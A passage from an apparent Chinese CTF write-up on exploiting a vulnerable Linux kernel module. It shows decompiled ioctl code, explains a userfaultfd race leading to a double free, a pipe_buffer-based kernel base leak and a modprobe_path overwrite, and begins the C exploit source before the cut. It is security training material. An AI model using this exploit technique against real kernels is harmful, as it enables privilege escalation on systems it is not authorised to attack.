class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">kernel_ioctl</span><span class="params">(file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 idx_low; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// r12</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> size; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v12; <span class="comment">// r13</span></span><br><span class="line">  __int64 v13; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">char</span> *buf; <span class="comment">// r14</span></span><br><span class="line">  edit_args a4; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v16; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(file, *(_QWORD *)&amp;cmd);</span><br><span class="line">  v16 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">0x30</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !copy_from_user(&amp;a4, v3, <span class="number">8LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( delFlags &lt;= <span class="number">1</span> &amp;&amp; LODWORD(a4.idx) &lt;= <span class="number">0x20</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        idx_low = LODWORD(a4.idx);</span><br><span class="line">        v6 = addrList[LODWORD(a4.idx)];</span><br><span class="line">        <span class="keyword">if</span> ( v6 )</span><br><span class="line">        &#123;</span><br><span class="line">          kfree(v6);</span><br><span class="line">          ++delFlags;</span><br><span class="line">          addrList[idx_low] = <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">0x50</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !copy_from_user(&amp;a4, v3, <span class="number">0x18</span>LL) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( editFlags &lt;= <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        size = a4.size;</span><br><span class="line">        <span class="keyword">if</span> ( LODWORD(a4.size) &gt; <span class="number">0x400</span> )</span><br><span class="line">          size = <span class="number">0x400</span>;</span><br><span class="line">        <span class="keyword">if</span> ( LODWORD(a4.idx) &lt;= <span class="number">0x20</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v12 = addrList[LODWORD(a4.idx)];</span><br><span class="line">          <span class="keyword">if</span> ( v12 )</span><br><span class="line">          &#123;</span><br><span class="line">            v13 = size;</span><br><span class="line">            buf = a4.buf;</span><br><span class="line">            _check_object_size(v12, size, <span class="number">0LL</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !copy_from_user(v12, buf, v13) )</span><br><span class="line">            &#123;</span><br><span class="line">              ++editFlags;</span><br><span class="line">              <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( cmd != <span class="number">0x20</span> )</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(&amp;a4, v3, <span class="number">0x10</span>LL) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( addFlags &gt; <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v7 = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">10</span>], <span class="number">0xCC0</span>LL, <span class="number">0x400</span>LL);</span><br><span class="line">  v8 = (<span class="keyword">char</span> *)v7;</span><br><span class="line">  <span class="keyword">if</span> ( !v7 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v9 = copy_from_user(v7, a4.size, <span class="number">0x400</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = (<span class="keyword">int</span>)v9;</span><br><span class="line">    <span class="keyword">if</span> ( !addrList[v9] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ++v9 == <span class="number">0x20</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ++addFlags;</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  addrList[v10] = v8;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里分别是add，del，edit三个功能。并且不存在直接的漏洞，不过题目没有加锁的操作。</p><p>再就是题目所打开的保护是kaslr，kpti，smep，smap四个保护。</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><h3 id="构造double-free"><a href="#构造double-free" class="headerlink" title="构造double free"></a>构造double free</h3><p>我们要知道的是在slab管理器中的指向。<code>slab-&gt;freelist</code>指向的是我们刚刚free掉的object，然后我们的object中间的某个位置修改为原始是<code>slab-&gt;freelist</code>。</p><p>那么按照题目来看如果我们使用userfaultfd在edit的第二个<code>copy_from_user</code>阻塞进程同时在另一个进程free掉刚刚到object，那么我们在缺陷页处理返回新的页时修改掉object中的指针即可。并且这里采用的方法是partial write。</p><h3 id="泄漏基地址"><a href="#泄漏基地址" class="headerlink" title="泄漏基地址"></a>泄漏基地址</h3><p>既然有了double free那么后续就很好办了，这里借用上一篇文章中的思路，我们首先申请sk_buff结构体获得object，随后使用pipe_buffer获取同一块object并把ops写到堆上，那么紧接着只需要将<code>pipe_buffer-&gt;ops</code>读出即可。</p><h3 id="modprobe-path"><a href="#modprobe-path" class="headerlink" title="modprobe_path"></a>modprobe_path</h3><p>详细可以参考这篇文章：<a href="https://cv196082.gitee.io/2022/08/10/starCTF-2019-hackme/">https://cv196082.gitee.io/2022/08/10/starCTF-2019-hackme/</a></p><p>既然我们有了kernel基地址，那么直接根据偏移获取modprobe_path。同样修改object的指针，构造fake_object指向modprobe_path即可。</p><h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOCKET_NUM 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SK_BUFF_NUM 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_NUM 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_NUM2 16</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> page;</span><br><span class="line">    <span class="keyword">uint32_t</span> offset, len;</span><br><span class="line">    <span class="keyword">uint64_t</span> ops;</span><br><span class="line">    <span class="keyword">uint32_t</span> flags;</span><br><span class="line">    <span class="keyword">uint32_t</span> padding;</span><br><span class="line">    <span class="keyword">uint64_t</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> confirm;</span><br><span class="line">    <span class="keyword">uint64_t</span> release;</span><br><span class="line">    <span class="keyword">uint64_t</span> try_steal;</span><br><span class="line">    <span class="keyword">uint64_t</span> get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page, <span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;</span><br><span class="line">    ur.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    ur.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">edit_handle</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>)arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] edit handler created&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] edit handler unblocked&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> *page = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">        <span class="comment">// init page</span></span><br><span class="line">        <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">        *(page + <span class="number">0x201</span>) = <span class="number">0x64</span>;</span><br><span class="line"></span><br><span class="line">        uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">        uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp;</span><br><span class="line">                 ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">        uc.len = <span class="number">0x1000</span>;</span><br><span class="line">        uc.mode = <span class="number">0</span>;</span><br><span class="line">        uc.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uc) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] edit handler done&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">add_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> idx;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">edit_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> idx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> size;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">del_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> idx;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">add_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.idx = <span class="number">0</span>;</span><br><span class="line">    arg.buf = buf;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, <span class="number">0x20</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">del</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">del_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, <span class="number">0x30</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span 